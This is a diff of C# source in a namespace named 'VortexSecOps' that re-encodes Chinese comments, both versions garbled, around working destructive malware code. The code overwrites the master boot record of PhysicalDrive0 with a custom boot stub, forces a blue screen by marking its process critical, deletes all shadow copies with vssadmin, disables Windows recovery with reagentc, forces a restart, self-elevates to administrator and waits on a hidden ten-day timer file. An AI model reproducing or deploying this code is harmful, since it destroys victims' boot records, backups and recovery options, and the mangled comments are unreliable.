                 ProcessStartInfo takeownPsi = new ProcessStartInfo
@@ -268,40 +268,40 @@ namespace VortexSecOps
                 Process.Start(icaclsPsi).WaitForExit();
             }
             /// <summary>
-            /// Èç¹ûMBR±¸·İÎÄ¼ş²»´æÔÚ£¬¾ÍÍ¨¹ıWindows API¶ÁÈ¡MBR£¬²¢Ğ´Èë±¸·İÎÄ¼şÖĞ£»
-            /// Èç¹û´æÔÚ£¬¾Í»ñÈ¡MBR¡£
+            /// å¦‚æœMBRå¤‡ä»½æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå°±é€šè¿‡Windows APIè¯»å–MBRï¼Œå¹¶å†™å…¥å¤‡ä»½æ–‡ä»¶ä¸­ï¼›
+            /// å¦‚æœå­˜åœ¨ï¼Œå°±è·å–MBRã€‚
             /// </summary>
-            /// <returns>»ñÈ¡µ½µÄMBR</returns>
+            /// <returns>è·å–åˆ°çš„MBR</returns>
             public static byte[] GetMbrUsingWindowsAPI()
             {
-                // ¶¨ÒåÎïÀíÇı¶¯Æ÷µÄÂ·¾¶
+                // å®šä¹‰ç‰©ç†é©±åŠ¨å™¨çš„è·¯å¾„
                 string physicalDrivePath = @"\\.\PhysicalDrive0";
-                // ÓÃÓÚ´æ´¢Êµ¼Ê¶ÁÈ¡µÄ×Ö½ÚÊı
+                // ç”¨äºå­˜å‚¨å®é™…è¯»å–çš„å­—èŠ‚æ•°
                 uint bytesRead = 0;
-                // ¿ÕÖµ³£Á¿
+                // ç©ºå€¼å¸¸é‡
                 uint NULL_VALUE = 0;
-                // ÓÃÓÚ´æ´¢ MBR Êı¾İµÄ×Ö½ÚÊı×é
+                // ç”¨äºå­˜å‚¨ MBR æ•°æ®çš„å­—èŠ‚æ•°ç»„
                 byte[] masterBootRecordData = new byte[512];
-                // ¶¨Òå MBR ´æ´¢ÎÄ¼ş¼ĞµÄÂ·¾¶
+                // å®šä¹‰ MBR å­˜å‚¨æ–‡ä»¶å¤¹çš„è·¯å¾„
                 const string MBR_STORAGE_PATH = @"C:\bin";
-                // ¼ì²é MBR ´æ´¢ÎÄ¼ş¼ĞÊÇ·ñ´æÔÚ£¬Èç¹û²»´æÔÚÔò´´½¨
+                // æ£€æŸ¥ MBR å­˜å‚¨æ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»º
                 if (!Directory.Exists(MBR_STORAGE_PATH))
                 {
                     Directory.CreateDirectory(MBR_STORAGE_PATH);
                 }
-                // ¼ì²é MBR ±¸·İÎÄ¼şÊÇ·ñ´æÔÚ
+                // æ£€æŸ¥ MBR å¤‡ä»½æ–‡ä»¶æ˜¯å¦å­˜åœ¨
                 if (!File.Exists(MBR_PATH))
                 {
-                    // ´ò¿ªÎïÀíÇı¶¯Æ÷µÄ¾ä±ú
+                    // æ‰“å¼€ç‰©ç†é©±åŠ¨å™¨çš„å¥æŸ„
                     HANDLE handle = CreateFileA(physicalDrivePath, Generic_Read, File_Share_Read, NULL_VALUE, Open_Existing, NULL_VALUE, IntPtr.Zero);
                     if (handle != IntPtr.Zero)
                     {
-                        // ´ÓÎïÀíÇı¶¯Æ÷¶ÁÈ¡ MBR Êı¾İ
+                        // ä»ç‰©ç†é©±åŠ¨å™¨è¯»å– MBR æ•°æ®
                         if (ReadFile(handle, masterBootRecordData, 512, ref bytesRead, IntPtr.Zero))
                         {
                             try
                             {
-                                // ´´½¨»ò´ò¿ª MBR ±¸·İÎÄ¼ş²¢Ğ´ÈëÊı¾İ
+                                // åˆ›å»ºæˆ–æ‰“å¼€ MBR å¤‡ä»½æ–‡ä»¶å¹¶å†™å…¥æ•°æ®
                                 using (FileStream fileStream = new FileStream(MBR_PATH, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite))
                                 {
                                     fileStream.Write(masterBootRecordData, 0, 512);
@@ -309,33 +309,33 @@ namespace VortexSecOps
                             }
                             catch (Exception)
                             {
-                                // ·¢ÉúÒì³£Ê±·µ»Ø null
+                                // å‘ç”Ÿå¼‚å¸¸æ—¶è¿”å› null
                                 return null;
                             }
                             finally
                             {
-                                // ¹Ø±Õ¾ä±ú
+                                // å…³é—­å¥æŸ„
                                 CloseHandle(handle);
                             }
                         }
                         else
                         {
-                            // ¶ÁÈ¡Ê§°ÜÊ±¹Ø±Õ¾ä±ú²¢·µ»Ø null
+                            // è¯»å–å¤±è´¥æ—¶å…³é—­å¥æŸ„å¹¶è¿”å› null
                             CloseHandle(handle);
                             return null;
                         }
                     }
                     else
                     {
-                        // ´ò¿ª¾ä±úÊ§°ÜÊ±·µ»Ø null
+                        // æ‰“å¼€å¥æŸ„å¤±è´¥æ—¶è¿”å› null
                         return null;
                     }
                 }
                 try
                 {
-                    // ÖØĞÂ³õÊ¼»¯ MBR Êı¾İÊı×é
+                    // é‡æ–°åˆå§‹åŒ– MBR æ•°æ®æ•°ç»„
                     masterBootRecordData = new byte[512];
-                    // ´Ó MBR ±¸·İÎÄ¼şÖĞ¶ÁÈ¡Êı¾İ
+                    // ä» MBR å¤‡ä»½æ–‡ä»¶ä¸­è¯»å–æ•°æ®
                     using (FileStream fileStream = new FileStream(MBR_PATH, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                     {
                         fileStream.Read(masterBootRecordData, 0, 512);
@@ -344,47 +344,47 @@ namespace VortexSecOps
                 }
                 catch (Exception)
                 {
-                    // ·¢ÉúÒì³£Ê±·µ»Ø null
+                    // å‘ç”Ÿå¼‚å¸¸æ—¶è¿”å› null
                     return null;
                 }
             }
 
-            // Í¨¹ıÎÄ¼şÁ÷»ñÈ¡ MBR Êı¾İ
+            // é€šè¿‡æ–‡ä»¶æµè·å– MBR æ•°æ®
             public static byte[] GetMbrByFileStream()
             {
-                // ¶¨ÒåÎïÀíÇı¶¯Æ÷µÄÂ·¾¶
+                // å®šä¹‰ç‰©ç†é©±åŠ¨å™¨çš„è·¯å¾„
                 string physicalDrivePath = @"\\.\PhysicalDrive0";
-                // ÓÃÓÚ´æ´¢ MBR Êı¾İµÄ×Ö½ÚÊı×é
+                // ç”¨äºå­˜å‚¨ MBR æ•°æ®çš„å­—èŠ‚æ•°ç»„
                 byte[] masterBootRecordData = new byte[512];
-                // ¶¨Òå MBR ´æ´¢ÎÄ¼ş¼ĞµÄÂ·¾¶
+                // å®šä¹‰ MBR å­˜å‚¨æ–‡ä»¶å¤¹çš„è·¯å¾„
                 const string MBR_STORAGE_PATH = @"C:\bin";
-                // ¼ì²é MBR ´æ´¢ÎÄ¼ş¼ĞÊÇ·ñ´æÔÚ£¬Èç¹û²»´æÔÚÔò´´½¨
+                // æ£€æŸ¥ MBR å­˜å‚¨æ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»º
                 if (!Directory.Exists(MBR_STORAGE_PATH))
                 {
                     DirectoryInfo directory = new DirectoryInfo(MBR_STORAGE_PATH);
                     directory.Create();
                 }
-                // »ñÈ¡ MBR ±¸·İÎÄ¼şµÄĞÅÏ¢
+                // è·å– MBR å¤‡ä»½æ–‡ä»¶çš„ä¿¡æ¯
                 FileInfo mbrFileInfo = new FileInfo(MBR_PATH);
                 if (!mbrFileInfo.Exists)
                 {
-                    // ´ò¿ªÎïÀíÇı¶¯Æ÷µÄÎÄ¼şÁ÷²¢¶ÁÈ¡ MBR Êı¾İ
+                    // æ‰“å¼€ç‰©ç†é©±åŠ¨å™¨çš„æ–‡ä»¶æµå¹¶è¯»å– MBR æ•°æ®
                     using (FileStream fileStream = new FileStream(physicalDrivePath, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                     {
                         fileStream.Read(masterBootRecordData, 0, 512);
                     }
-                    // ´´½¨»ò´ò¿ª MBR ±¸·İÎÄ¼ş²¢Ğ´ÈëÊı¾İ
+                    // åˆ›å»ºæˆ–æ‰“å¼€ MBR å¤‡ä»½æ–‡ä»¶å¹¶å†™å…¥æ•°æ®
                     using (FileStream fileStream1 = new FileStream(MBR_PATH, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite))
                     {
                         fileStream1.Write(masterBootRecordData, 0, 512);
                     }
-                    // ½« MBR Êı¾İÊı×éÇåÁã
+                    // å°† MBR æ•°æ®æ•°ç»„æ¸…é›¶
                     for (int i = 0; i < 512; i++)
                     {
                         masterBootRecordData[i] = 0;
                     }
                 }
-                // ´Ó MBR ±¸·İÎÄ¼şÖĞ¶ÁÈ¡Êı¾İ
+                // ä» MBR å¤‡ä»½æ–‡ä»¶ä¸­è¯»å–æ•°æ®
                 using (FileStream fileStream2 = new FileStream(MBR_PATH, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                 {
                     fileStream2.Read(masterBootRecordData, 0, 512);
@@ -392,100 +392,100 @@ namespace VortexSecOps
                 return masterBootRecordData;
             }
 
-            // Òì²½¼ì²éÊ±¼äÊÇ·ñµ½´ïÖ¸¶¨ÈÕÆÚ
+            // å¼‚æ­¥æ£€æŸ¥æ—¶é—´æ˜¯å¦åˆ°è¾¾æŒ‡å®šæ—¥æœŸ
             public static async Task<bool> CheckTimeAsync(string filename = @"time.txt", int daysLater = 10)
             {
-                // ¶¨ÒåÊ±¼äÎÄ¼ş´æ´¢ÎÄ¼ş¼ĞµÄÂ·¾¶
+                // å®šä¹‰æ—¶é—´æ–‡ä»¶å­˜å‚¨æ–‡ä»¶å¤¹çš„è·¯å¾„
                 const string TIME_FOLDER_PATH = @"C:\time8597";
-                // ¹¹½¨Ê±¼äÎÄ¼şµÄÍêÕûÂ·¾¶
+                // æ„å»ºæ—¶é—´æ–‡ä»¶çš„å®Œæ•´è·¯å¾„
                 string timeFilePath = Path.Combine(TIME_FOLDER_PATH, filename);
-                // »ñÈ¡Ê±¼äÎÄ¼ş´æ´¢ÎÄ¼ş¼ĞµÄĞÅÏ¢
+                // è·å–æ—¶é—´æ–‡ä»¶å­˜å‚¨æ–‡ä»¶å¤¹çš„ä¿¡æ¯
                 DirectoryInfo directory = new DirectoryInfo(TIME_FOLDER_PATH);
-                // ¼ì²éÊ±¼äÎÄ¼ş´æ´¢ÎÄ¼ş¼ĞÊÇ·ñ´æÔÚ£¬Èç¹û²»´æÔÚÔò´´½¨
+                // æ£€æŸ¥æ—¶é—´æ–‡ä»¶å­˜å‚¨æ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»º
                 if (!directory.Exists)
                 {
                     directory.Create();
                 }
-                // ½«Ê±¼äÎÄ¼ş´æ´¢ÎÄ¼ş¼ĞÉèÖÃÎªÒş²ØÊôĞÔ
+                // å°†æ—¶é—´æ–‡ä»¶å­˜å‚¨æ–‡ä»¶å¤¹è®¾ç½®ä¸ºéšè—å±æ€§
                 directory.Attributes = FileAttributes.Hidden;
                 if (!File.Exists(timeFilePath))
                 {
-                    // ¼ÆËãÖ¸¶¨ÌìÊıºóµÄÈÕÆÚ
+                    // è®¡ç®—æŒ‡å®šå¤©æ•°åçš„æ—¥æœŸ
                     DateTime futureDateTime = DateTime.Now.AddDays(daysLater);
-                    // ½«ÈÕÆÚĞÅÏ¢Ğ´ÈëÊ±¼äÎÄ¼ş
+                    // å°†æ—¥æœŸä¿¡æ¯å†™å…¥æ—¶é—´æ–‡ä»¶
                     File.WriteAllText(timeFilePath, $"{futureDateTime.Year}--time--{futureDateTime.Month}--time--{futureDateTime.Day}");
                 }
-                // ¶ÁÈ¡Ê±¼äÎÄ¼şÖĞµÄÈÕÆÚĞÅÏ¢
+                // è¯»å–æ—¶é—´æ–‡ä»¶ä¸­çš„æ—¥æœŸä¿¡æ¯
                 string storedTimeString = File.ReadAllText(timeFilePath);
-                // ¶¨Òå·Ö¸ô·ûÊı×é
+                // å®šä¹‰åˆ†éš”ç¬¦æ•°ç»„
                 string[] splits = { "--time--" };
-                // ·Ö¸îÈÕÆÚĞÅÏ¢×Ö·û´®
+                // åˆ†å‰²æ—¥æœŸä¿¡æ¯å­—ç¬¦ä¸²
                 string[] dateComponents = storedTimeString.Split(splits, StringSplitOptions.None);
-                // »ñÈ¡Äê·İ
+                // è·å–å¹´ä»½
                 int year = Convert.ToInt32(dateComponents[0]);
-                // »ñÈ¡ÔÂ·İ
+                // è·å–æœˆä»½
                 int month = Convert.ToInt32(dateComponents[1]);
-                // »ñÈ¡ÈÕÆÚ
+                // è·å–æ—¥æœŸ
                 int day = Convert.ToInt32(dateComponents[2]);
-                // ¹¹½¨Ä¿±êÈÕÆÚ¶ÔÏó
+                // æ„å»ºç›®æ ‡æ—¥æœŸå¯¹è±¡
                 DateTime targetDateTime = new DateTime(year, month, day);
                 while (true)
                 {
-                    // »ñÈ¡µ±Ç°ÈÕÆÚÊ±¼ä
+                    // è·å–å½“å‰æ—¥æœŸæ—¶é—´
                     DateTime now = DateTime.Now;
                     if (now >= targetDateTime)
                     {
-                        // Èç¹ûµ±Ç°ÈÕÆÚÊ±¼ä´óÓÚµÈÓÚÄ¿±êÈÕÆÚÊ±¼ä£¬·µ»Ø true
+                        // å¦‚æœå½“å‰æ—¥æœŸæ—¶é—´å¤§äºç­‰äºç›®æ ‡æ—¥æœŸæ—¶é—´ï¼Œè¿”å› true
                         return true;
                     }
-                    // Òì²½ÑÓ³Ù 200 ºÁÃë
+                    // å¼‚æ­¥å»¶è¿Ÿ 200 æ¯«ç§’
                     await Task.Delay(200);
                 }
             }
 
             /// <summary>
-            /// ¼ì²âÊÇ·ñÎª¹ÜÀíÔ±Éí·İÔËĞĞ
+            /// æ£€æµ‹æ˜¯å¦ä¸ºç®¡ç†å‘˜èº«ä»½è¿è¡Œ
             /// </summary>
-            /// <returns>ÊÇ¹ÜÀíÔ±·µ»Ø true£¬²»ÊÇÔòÎª false</returns>
+            /// <returns>æ˜¯ç®¡ç†å‘˜è¿”å› trueï¼Œä¸æ˜¯åˆ™ä¸º false</returns>
             public static bool IsRunningAsAdministrator()
             {
-                // »ñÈ¡µ±Ç°ÓÃ»§µÄÉí·İĞÅÏ¢
+                // è·å–å½“å‰ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯
                 WindowsIdentity identity = WindowsIdentity.GetCurrent();
-                // ´´½¨ Windows Ö÷Ìå¶ÔÏó
+                // åˆ›å»º Windows ä¸»ä½“å¯¹è±¡
                 WindowsPrincipal principal = new WindowsPrincipal(identity);
-                // ¼ì²éÊÇ·ñÎª¹ÜÀíÔ±½ÇÉ«
+                // æ£€æŸ¥æ˜¯å¦ä¸ºç®¡ç†å‘˜è§’è‰²
                 return principal.IsInRole(WindowsBuiltInRole.Administrator);
             }
 
             /// <summary>
-            /// ÒÔ¹ÜÀíÔ±Éí·İÔËĞĞ×ÔÉí½ø³Ì
+            /// ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œè‡ªèº«è¿›ç¨‹
             /// </summary>
             public static void RestartCurrentAppAsAdmin()
             {
-                // ´´½¨½ø³ÌÆô¶¯ĞÅÏ¢¶ÔÏó
+                // åˆ›å»ºè¿›ç¨‹å¯åŠ¨ä¿¡æ¯å¯¹è±¡
                 ProcessStartInfo startInfo = new ProcessStartInfo();
-                // ÉèÖÃÒªÆô¶¯µÄ½ø³ÌµÄÎÄ¼şÃû
+                // è®¾ç½®è¦å¯åŠ¨çš„è¿›ç¨‹çš„æ–‡ä»¶å
                 startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
-                // ÉèÖÃÒÔ¹ÜÀíÔ±Éí·İÔËĞĞ
+                // è®¾ç½®ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ
                 startInfo.Verb = "runas";
                 try
                 {
-                    // Æô¶¯½ø³Ì
+                    // å¯åŠ¨è¿›ç¨‹
                     Process.Start(startInfo);
                 }
                 catch (Exception ex)
                 {
-                    // ²¶»ñÒì³£²¢ÏÔÊ¾´íÎóÏûÏ¢¿ò
-                    MessageBox.Show(ex.Message, "´íÎó", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    // æ•è·å¼‚å¸¸å¹¶æ˜¾ç¤ºé”™è¯¯æ¶ˆæ¯æ¡†
+                    MessageBox.Show(ex.Message, "é”™è¯¯", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
                 finally
                 {
-                    // ÍË³öµ±Ç°½ø³Ì
+                    // é€€å‡ºå½“å‰è¿›ç¨‹
                     Environment.Exit(0);
                 }
             }
 
-            // ÄÚ²¿Àà£¬ÊµÏÖÁË¶à¸ö½Ó¿Ú£¬ÓÃÓÚÖ´ĞĞ¸÷ÖÖÏµÍ³²Ù×÷
+            // å†…éƒ¨ç±»ï¼Œå®ç°äº†å¤šä¸ªæ¥å£ï¼Œç”¨äºæ‰§è¡Œå„ç§ç³»ç»Ÿæ“ä½œ
             private class OpMaster : INormalOperator, IWindowsAPIOperator, IConfigCorrupter
             {
                 bool IWindowsAPIOperator.CloseHandle(HANDLE hObject)
@@ -504,166 +504,166 @@ namespace VortexSecOps
                 {
                     return ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, ref lpNumberOfBytesRead, lpOverlapped);
                 }
-                // ÓÃÓÚ´¥·¢À¶ÆÁµÄ·½·¨
+                // ç”¨äºè§¦å‘è“å±çš„æ–¹æ³•
                 void IConfigCorrupter.TriggerBlueScreen()
                 {
-                    // ÉèÖÃ½ø³ÌÎª¹Ø¼ü½ø³Ì
+                    // è®¾ç½®è¿›ç¨‹ä¸ºå…³é”®è¿›ç¨‹
                     int isCritical = 1;
-                    // ¶¨Òå BreakOnTermination ³£Á¿
+                    // å®šä¹‰ BreakOnTermination å¸¸é‡
                     int BreakOnTermination = 29;
-                    // µ÷ÓÃ Windows API ÉèÖÃ½ø³ÌĞÅÏ¢
+                    // è°ƒç”¨ Windows API è®¾ç½®è¿›ç¨‹ä¿¡æ¯
                     NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
-                    // ÍË³öµ±Ç°½ø³Ì
+                    // é€€å‡ºå½“å‰è¿›ç¨‹
                     Environment.Exit(0);
                 }
 
-                // ĞŞ¸ÄÖ÷Òıµ¼¼ÇÂ¼£¨MBR£©
+                // ä¿®æ”¹ä¸»å¼•å¯¼è®°å½•ï¼ˆMBRï¼‰
                 void INormalOperator.ModifyMasterBootRecord()
                 {
-                    // ¶¨Òå³õÊ¼µÄ MBR Êı¾İ
+                    // å®šä¹‰åˆå§‹çš„ MBR æ•°æ®
                     byte[] initialMbrData = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
-                    // ´´½¨Ò»¸ö 512 ×Ö½ÚµÄ MBR Êı¾İÊı×é
+                    // åˆ›å»ºä¸€ä¸ª 512 å­—èŠ‚çš„ MBR æ•°æ®æ•°ç»„
                     byte[] mbrdata = new byte[512];
-                    // ½«³õÊ¼ MBR Êı¾İ¸´ÖÆµ½ MBR Êı¾İÊı×éÖĞ
+                    // å°†åˆå§‹ MBR æ•°æ®å¤åˆ¶åˆ° MBR æ•°æ®æ•°ç»„ä¸­
                     for (int i = 0; i < initialMbrData.Length; i++)
                     {
                         mbrdata[i] = initialMbrData[i];
                     }
-                    // ÉèÖÃ MBR Êı¾İµÄ×îºóÁ½¸ö×Ö½Ú
+                    // è®¾ç½® MBR æ•°æ®çš„æœ€åä¸¤ä¸ªå­—èŠ‚
                     mbrdata[510] = 0x55;
                     mbrdata[511] = 0xAA;
-                    // ¶¨ÒåÎïÀíÇı¶¯Æ÷µÄÂ·¾¶
+                    // å®šä¹‰ç‰©ç†é©±åŠ¨å™¨çš„è·¯å¾„
                     string physicalDrivePath = @"\\.\PhysicalDrive0";
-                    // ´ò¿ªÎïÀíÇı¶¯Æ÷µÄÎÄ¼şÁ÷²¢Ğ´Èë MBR Êı¾İ
+                    // æ‰“å¼€ç‰©ç†é©±åŠ¨å™¨çš„æ–‡ä»¶æµå¹¶å†™å…¥ MBR æ•°æ®
                     using (FileStream file = new FileStream(physicalDrivePath, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                     {
                         file.Write(mbrdata, 0, 512);
                     }
                 }
 
-                // Ê¹ÓÃWindows APIĞŞ¸Ä£¨MBR£©
+                // ä½¿ç”¨Windows APIä¿®æ”¹ï¼ˆMBRï¼‰
                 bool IWindowsAPIOperator.ModifyMasterBootRecord()
                 {
-                    // ¶¨ÒåÎïÀíÇı¶¯Æ÷µÄÂ·¾¶
+                    // å®šä¹‰ç‰©ç†é©±åŠ¨å™¨çš„è·¯å¾„
                     const string physicalDrivePath = @"\\.\PhysicalDrive0";
-                    // ÓÃÓÚ´æ´¢Êµ¼ÊĞ´ÈëµÄ×Ö½ÚÊı
+                    // ç”¨äºå­˜å‚¨å®é™…å†™å…¥çš„å­—èŠ‚æ•°
                     int bytesWritten = 0;
-                    // ¿ÕÖµ³£Á¿
+                    // ç©ºå€¼å¸¸é‡
                     uint NULL_VALUE = 0;
-                    // ¶¨Òå³õÊ¼µÄ MBR Êı¾İ
+                    // å®šä¹‰åˆå§‹çš„ MBR æ•°æ®
                     byte[] initialMbrData = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
-                    // ´´½¨Ò»¸ö 512 ×Ö½ÚµÄ MBR Êı¾İÊı×é
+                    // åˆ›å»ºä¸€ä¸ª 512 å­—èŠ‚çš„ MBR æ•°æ®æ•°ç»„
                     byte[] masterBootRecordData = new byte[512];
-                    // ½«³õÊ¼ MBR Êı¾İ¸´ÖÆµ½ MBR Êı¾İÊı×éÖĞ
+                    // å°†åˆå§‹ MBR æ•°æ®å¤åˆ¶åˆ° MBR æ•°æ®æ•°ç»„ä¸­
                     for (int i = 0; i < initialMbrData.Length; i++)
                     {
                         masterBootRecordData[i] = initialMbrData[i];
                     }
-                    // ÉèÖÃ MBR Êı¾İµÄ×îºóÁ½¸ö×Ö½Ú
+                    // è®¾ç½® MBR æ•°æ®çš„æœ€åä¸¤ä¸ªå­—èŠ‚
                     masterBootRecordData[510] = 0x55;
                     masterBootRecordData[511] = 0xAA;
-                    // ´ò¿ªÎïÀíÇı¶¯Æ÷µÄ¾ä±ú
+                    // æ‰“å¼€ç‰©ç†é©±åŠ¨å™¨çš„å¥æŸ„
                     HANDLE masterBootRecord = CreateFileA(physicalDrivePath, Generic_Read | Generic_Write, File_Share_Read | File_Share_Write, NULL_VALUE, Open_Existing, NULL_VALUE, HANDLE.Zero);
-                    // Ğ´Èë MBR Êı¾İ
+                    // å†™å…¥ MBR æ•°æ®
                     bool isWriteSuccessful = WriteFile(masterBootRecord, masterBootRecordData, 512, ref bytesWritten, IntPtr.Zero);
                     if (masterBootRecord != IntPtr.Zero)
                     {
-                        // ¹Ø±Õ¾ä±ú
+                        // å…³é—­å¥æŸ„
                         CloseHandle(masterBootRecord);
                     }
                     return isWriteSuccessful;
                 }
                 void IConfigCorrupter.DeleteAllRestorePoints()
                 {
-                    // ´´½¨½ø³ÌÆô¶¯ĞÅÏ¢¶ÔÏó
+                    // åˆ›å»ºè¿›ç¨‹å¯åŠ¨ä¿¡æ¯å¯¹è±¡
                     ProcessStartInfo startInfo = new ProcessStartInfo()
                     {
-                        // ÉèÖÃÒªÆô¶¯µÄ½ø³ÌµÄÎÄ¼şÃû
+                        // è®¾ç½®è¦å¯åŠ¨çš„è¿›ç¨‹çš„æ–‡ä»¶å
                         FileName = @"vssadmin.exe",
-                        // ÉèÖÃÉ¾³ıËùÓĞ¾íÓ°¸±±¾µÄ²ÎÊı
+                        // è®¾ç½®åˆ é™¤æ‰€æœ‰å·å½±å‰¯æœ¬çš„å‚æ•°
                         Arguments = "delete shadows /all /quiet",
-                        //ÒÔ¹ÜÀíÔ±Éí·İÔËĞĞ´Ë½ø³Ì
+                        //ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œæ­¤è¿›ç¨‹
                         Verb = "runas",
-                        // ²»Ê¹ÓÃ shell Ö´ĞĞ
+                        // ä¸ä½¿ç”¨ shell æ‰§è¡Œ
                         UseShellExecute = false,
-                        // ²»´´½¨´°¿Ú
+                        // ä¸åˆ›å»ºçª—å£
                         CreateNoWindow = true,
                     };
-                    // Æô¶¯½ø³Ì
+                    // å¯åŠ¨è¿›ç¨‹
                     Process.Start(startInfo).WaitForExit();
                 }
-                // ÓÃÓÚÖØÆô¼ÆËã»úµÄ·½·¨
+                // ç”¨äºé‡å¯è®¡ç®—æœºçš„æ–¹æ³•
                 void IConfigCorrupter.RestartComputer()
                 {
-                    // ´´½¨½ø³ÌÆô¶¯ĞÅÏ¢¶ÔÏó
+                    // åˆ›å»ºè¿›ç¨‹å¯åŠ¨ä¿¡æ¯å¯¹è±¡
                     ProcessStartInfo startInfo = new ProcessStartInfo()
                     {
-                        // ÉèÖÃÒªÆô¶¯µÄ½ø³ÌµÄÎÄ¼şÃû
+                        // è®¾ç½®è¦å¯åŠ¨çš„è¿›ç¨‹çš„æ–‡ä»¶å
                         FileName = @"shutdown.exe",
-                        // ÉèÖÃÖØÆô¼ÆËã»úµÄ²ÎÊı
+                        // è®¾ç½®é‡å¯è®¡ç®—æœºçš„å‚æ•°
                         Arguments = "/r /t 0",
-                        // ²»Ê¹ÓÃ shell Ö´ĞĞ
+                        // ä¸ä½¿ç”¨ shell æ‰§è¡Œ
                         UseShellExecute = false,
-                        // ²»´´½¨´°¿Ú
+                        // ä¸åˆ›å»ºçª—å£
                         CreateNoWindow = true,
                     };
-                    // Æô¶¯½ø³Ì
+                    // å¯åŠ¨è¿›ç¨‹
                     Process.Start(startInfo);
                 }
 
-                // ½ûÓÃWindows»Ö¸´»·¾³
+                // ç¦ç”¨Windowsæ¢å¤ç¯å¢ƒ
                 void IConfigCorrupter.DisableWindowsRecoveryEnvironment()
                 {
-                    // ´´½¨½ø³ÌÆô¶¯ĞÅÏ¢¶ÔÏó
+                    // åˆ›å»ºè¿›ç¨‹å¯åŠ¨ä¿¡æ¯å¯¹è±¡
                     ProcessStartInfo startInfo = new ProcessStartInfo()
                     {
-                        // ÉèÖÃÒªÆô¶¯µÄ½ø³ÌµÄÎÄ¼şÃû
+                        // è®¾ç½®è¦å¯åŠ¨çš„è¿›ç¨‹çš„æ–‡ä»¶å
                         FileName = @"reagentc.exe",
-                        // ÉèÖÃ½ûÓÃ Windows »Ö¸´»·¾³µÄ²ÎÊı
+                        // è®¾ç½®ç¦ç”¨ Windows æ¢å¤ç¯å¢ƒçš„å‚æ•°
                         Arguments = @"/disable",
-                        // ²»´´½¨´°¿Ú
+                        // ä¸åˆ›å»ºçª—å£
                         CreateNoWindow = true,
-                        // ²»Ê¹ÓÃ shell Ö´ĞĞ
+                        // ä¸ä½¿ç”¨ shell æ‰§è¡Œ
                         UseShellExecute = false,
                     };
-                    // Æô¶¯½ø³Ì
+                    // å¯åŠ¨è¿›ç¨‹
                     Process.Start(startInfo).WaitForExit();
                 }
 
-                // ½«´«ÈëµÄMBRÊı¾İĞ´ÈëÎïÀíÇı¶¯Æ÷
+                // å°†ä¼ å…¥çš„MBRæ•°æ®å†™å…¥ç‰©ç†é©±åŠ¨å™¨
                 void INormalOperator.WriteToMasterBootRecord(byte[] buffer)
                 {
-                    // ¶¨ÒåÎïÀíÇı¶¯Æ÷µÄÂ·¾¶
+                    // å®šä¹‰ç‰©ç†é©±åŠ¨å™¨çš„è·¯å¾„
                     string path = @"\\.\PhysicalDrive0";
-                    // ´ò¿ªÎïÀíÇı¶¯Æ÷µÄÎÄ¼şÁ÷²¢Ğ´Èë MBR Êı¾İ
+                    // æ‰“å¼€ç‰©ç†é©±åŠ¨å™¨çš„æ–‡ä»¶æµå¹¶å†™å…¥ MBR æ•°æ®
                     using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                     {
                         fileStream.Write(buffer, 0, 512);
                     }
                 }
 
-                // Ê¹ÓÃ Windows API ½«´«ÈëµÄ MBR Êı¾İĞ´ÈëÎïÀíÇı¶¯Æ÷
+                // ä½¿ç”¨ Windows API å°†ä¼ å…¥çš„ MBR æ•°æ®å†™å…¥ç‰©ç†é©±åŠ¨å™¨
                 bool IWindowsAPIOperator.WriteToMasterBootRecord(byte[] buffer)
                 {
-                    // ¶¨ÒåÎïÀíÇı¶¯Æ÷µÄÂ·¾¶
+                    // å®šä¹‰ç‰©ç†é©±åŠ¨å™¨çš„è·¯å¾„
                     string path = @"\\.\PhysicalDrive0";
-                    // ÓÃÓÚ´æ´¢Êµ¼ÊĞ´ÈëµÄ×Ö½ÚÊı
+                    // ç”¨äºå­˜å‚¨å®é™…å†™å…¥çš„å­—èŠ‚æ•°
                     int write = 0;
-                    // ¾ä±ú³õÊ¼»¯ÎªÁã
+                    // å¥æŸ„åˆå§‹åŒ–ä¸ºé›¶
                     HANDLE handle = IntPtr.Zero;
                     try
                     {
-                        // ´ò¿ªÎïÀíÇı¶¯Æ÷µÄ¾ä±ú
+                        // æ‰“å¼€ç‰©ç†é©±åŠ¨å™¨çš„å¥æŸ„
                         handle = CreateFileA(path, Generic_Read | Generic_Write,
                                     File_Share_Read | File_Share_Write,
                                     0, Open_Existing,
                                     0, IntPtr.Zero);
                         if (handle != IntPtr.Zero)
                         {
-                            // Ğ´Èë MBR Êı¾İ
+                            // å†™å…¥ MBR æ•°æ®
